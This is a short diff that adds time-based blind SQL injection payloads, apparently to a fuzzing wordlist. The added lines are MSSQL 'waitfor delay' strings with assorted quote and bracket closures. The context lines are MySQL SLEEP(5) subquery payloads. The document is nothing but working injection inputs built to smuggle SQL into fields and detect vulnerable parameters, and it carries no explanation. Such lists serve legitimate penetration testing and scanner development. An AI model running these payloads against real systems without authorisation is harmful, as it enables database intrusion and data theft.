@@ -1,3 +1,11 @@
+ ')) or sleep(5)='
+;waitfor delay '0:0:5'--
+);waitfor delay '0:0:5'--
+';waitfor delay '0:0:5'--
+";waitfor delay '0:0:5'--
+');waitfor delay '0:0:5'--
+");waitfor delay '0:0:5'--
+));waitfor delay '0:0:5'--
  AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe
  AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='
  AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
